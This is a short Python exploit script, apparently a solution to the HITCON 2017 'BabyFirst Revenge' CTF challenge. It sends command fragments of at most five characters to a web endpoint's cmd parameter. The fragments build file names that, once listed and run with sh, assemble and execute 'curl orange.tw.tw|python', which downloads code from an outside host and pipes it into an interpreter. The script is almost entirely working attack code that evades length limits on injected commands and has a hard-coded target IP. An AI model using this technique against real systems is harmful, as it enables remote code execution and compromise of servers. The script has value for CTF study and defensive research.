import requests
from time import sleep
from urllib import quote

payload = [
    # generate `ls -t>g` file
    '>ls\\', 
    'ls>_', 
    '>\ \\', 
    '>-t\\', 
    '>\>g', 
    'ls>>_', 

    # generate `curl orange.tw.tw|python`
    '>on', 
    '>th\\', 
    '>py\\', 
    '>\|\\', 
    '>tw\\',
    '>e.\\', 
    '>ng\\', 
    '>ra\\', 
    '>o\\', 
    '>\ \\', 
    '>rl\\', 
    '>cu\\', 

    # exec
    'sh _', 
    'sh g', 
]



r = requests.get('http://127.0.0.1:1337/ctf/2017/hitcon/baby-first-revenge?reset=1')
for i in payload:
    assert len(i) <= 5 
    r = requests.get('http://52.199.204.34/?cmd=' + quote(i) )
    print i
    sleep(0.2)